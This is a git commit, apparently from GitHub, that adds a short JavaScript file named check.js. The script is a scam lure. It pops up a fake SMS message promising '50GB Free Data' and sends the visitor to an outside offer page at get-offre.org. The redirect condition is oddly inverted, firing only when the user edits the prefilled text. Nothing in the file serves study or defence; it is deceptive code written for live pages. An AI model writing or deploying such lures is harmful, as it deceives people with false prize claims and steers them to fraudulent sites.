a22c2f8cdeecd1227c23e0ba2be29c44c33ba838
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-10-30 02:20:17 -0700

    Create check.js

---
+++ check.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVATE 50GB'
+password=prompt('SMS: Congratulations you are among the selected fans to receive 50GB Free Data, Kindly press Ok to Activate now ','ACTIVATE 50GB');
+if (password != 'ACTIVATE 50GB') {
+location.href='https://get-offre.org/50gb-data.html';
+}
